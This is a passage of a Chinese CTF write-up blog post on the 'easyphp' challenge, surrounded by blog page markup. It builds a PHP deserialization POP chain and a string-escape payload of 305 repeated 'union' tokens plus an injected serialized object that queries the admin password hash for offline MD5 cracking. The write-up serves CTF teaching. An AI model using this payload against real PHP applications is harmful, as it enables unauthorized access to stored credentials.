<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="comment">//return "0-0";</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age,$nickname)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;CtrlCase=<span class="keyword">new</span> dbCtrl;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$argument)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($newInfo,$sql)</span></span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sql= <span class="keyword">new</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=<span class="string">'admin'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = <span class="string">'admin'</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> UpdateHelper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>
+<p>得到</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">12</span>:<span class="string">"UpdateHelper"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">2</span>:<span class="string">"id"</span>;N;<span class="string">s:</span><span class="number">7</span>:<span class="string">"newinfo"</span>;N;<span class="string">s:</span><span class="number">3</span>:<span class="string">"sql"</span>;<span class="string">O:</span><span class="number">4</span>:<span class="string">"User"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">2</span>:<span class="string">"id"</span>;N;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;<span class="string">s:</span><span class="number">45</span>:<span class="string">"select password,id from user where username=?"</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;<span class="string">O:</span><span class="number">4</span>:<span class="string">"Info"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;N;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;N;<span class="string">s:</span><span class="number">8</span>:<span class="string">"CtrlCase"</span>;<span class="string">O:</span><span class="number">6</span>:<span class="string">"dbCtrl"</span>:<span class="number">2</span>:&#123;<span class="string">s:</span><span class="number">4</span>:<span class="string">"name"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"admin"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"token"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"admin"</span>;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><code>getNewInfo</code>方法默认返回的内容</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">4</span>:<span class="string">"Info"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">3</span>:<span class="string">"age"</span>;N;<span class="string">s:</span><span class="number">8</span>:<span class="string">"nickname"</span>;N;<span class="string">s:</span><span class="number">8</span>:<span class="string">"CtrlCase"</span>;N;&#125;</span><br></pre></td></tr></table></figure>
+<p>这里我们来控制<code>nickname</code>，那么我们需要逃逸出来的字符串为</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">";s:8:"</span>CtrlCase<span class="string">";O:12:"</span>UpdateHelpe<span class="string">r":3:&#123;s:2:"</span>id<span class="string">";N;s:7:"</span>newinfo<span class="string">";N;s:3:"</span>sql<span class="string">";O:4:"</span>Use<span class="string">r":3:&#123;s:2:"</span>id<span class="string">";N;s:3:"</span>age<span class="string">";s:45:"</span>select password,id from user where username=?<span class="string">";s:8:"</span>nickname<span class="string">";O:4:"</span>Info<span class="string">":3:&#123;s:3:"</span>age<span class="string">";N;s:8:"</span>nickname<span class="string">";N;s:8:"</span>CtrlCase<span class="string">";O:6:"</span>dbCtrl<span class="string">":2:&#123;s:4:"</span>name<span class="string">";s:5:"</span>admin<span class="string">";s:5:"</span>token<span class="string">";s:5:"</span>admin<span class="string">";&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+<p>计算一下他们的长度然后进行填充</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$b = <span class="string">'O:12:"UpdateHelper":3:&#123;s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:&#123;s:2:"id";N;s:3:"age";s:45:"select password,id from user where username=?";s:8:"nickname";O:4:"Info":3:&#123;s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";O:6:"dbCtrl":2:&#123;s:4:"name";s:5:"admin";s:5:"token";s:5:"admin";&#125;&#125;&#125;&#125;'</span>;</span><br><span class="line">$a = <span class="string">'";s:8:"CtrlCase";'</span>.$b;</span><br><span class="line"><span class="keyword">echo</span> strlen($a);</span><br></pre></td></tr></table></figure>
+<p>长度<code>305</code></p>
+<p>这里使用<code>union</code>来进行替换，则需要<code>305</code>个<code>union</code></p>
+<p><img src="/2020/02/26/春秋战“疫”easyphp题解/7.png" alt="7"></p>
+<p>最后的payload</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion<span class="string">";s:8:"</span>CtrlCase<span class="string">";O:12:"</span>UpdateHelpe<span class="string">r":3:&#123;s:2:"</span>id<span class="string">";N;s:7:"</span>newinfo<span class="string">";N;s:3:"</span>sql<span class="string">";O:4:"</span>Use<span class="string">r":3:&#123;s:2:"</span>id<span class="string">";N;s:3:"</span>age<span class="string">";s:45:"</span>select password,id from user where username=?<span class="string">";s:8:"</span>nickname<span class="string">";O:4:"</span>Info<span class="string">":3:&#123;s:3:"</span>age<span class="string">";N;s:8:"</span>nickname<span class="string">";N;s:8:"</span>CtrlCase<span class="string">";O:6:"</span>dbCtrl<span class="string">":2:&#123;s:4:"</span>name<span class="string">";s:5:"</span>admin<span class="string">";s:5:"</span>token<span class="string">";s:5:"</span>admin<span class="string">";&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+<p>在<code>upload.php</code>中传入执行，来查询<code>admin</code>的密码</p>
+<p><img src="/2020/02/26/春秋战“疫”easyphp题解/8.png" alt="8"></p>
+<p><code>MD5</code>解一下后拿出密码明文，登陆后就可以拿到<code>flag</code></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="夜莫离、 WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="夜莫离、 Alipay">
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/12/30/积累的一些web题目/" rel="next" title="积累的一些web题目">
+                <i class="fa fa-chevron-left"></i> 积累的一些web题目
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">夜莫离、</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">56</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yemoli" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://chxing.xyz/" title="Bling_Dog" target="_blank">Bling_Dog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.smi1e.top/" title="Smi1e" target="_blank">Smi1e</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://altman.vip/" title="Altman" target="_blank">Altman</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.virtua1.cn/" title="Virtua1" target="_blank">Virtua1</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.zhaoj.in/" title="赵" target="_blank">赵</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.dongzt.cn/" title="Alkaid" target="_blank">Alkaid</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cdusec.com/" title="CDUSEC" target="_blank">CDUSEC</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://cdusec.happyhacking.top/" title="CDUSEC内部博客" target="_blank">CDUSEC内部博客</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://jjhpkcr.xyz/" title="江江河畔砍柴人" target="_blank">江江河畔砍柴人</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.youknowi.xin/" title="图先生" target="_blank">图先生</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://a3ura.github.io/" title="a3ura" target="_blank">a3ura</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.recorday.cn/" title="C0d3r1iu" target="_blank">C0d3r1iu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.iloveflag.com/" title="醉梦半醒" target="_blank">醉梦半醒</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目源码"><span class="nav-number">1.</span> <span class="nav-text">题目源码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目分析"><span class="nav-number">2.</span> <span class="nav-text">题目分析</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">夜莫离、</span>
+
+  
+</div>
+
+
+  <!-- <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div> 
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>-->
+
+
+
+<div class="theme-info">
+ <div class="powered-by"></div>
+ <span class="post-count">博客全站共57.6k字</span>
+</div>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+</body>
+</html>
